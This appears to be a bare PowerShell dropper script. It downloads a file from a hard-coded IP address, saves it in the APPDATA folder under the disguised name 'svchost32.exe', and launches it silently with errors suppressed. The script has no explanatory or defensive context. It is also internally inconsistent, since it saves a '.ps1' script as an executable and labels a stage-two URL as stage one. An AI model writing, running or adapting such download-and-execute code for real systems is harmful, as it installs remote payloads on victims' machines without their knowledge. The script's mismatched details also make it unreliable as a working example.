
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.179/stage2.ps1",
    [string]$OutputPath = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $OutputPath)
Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
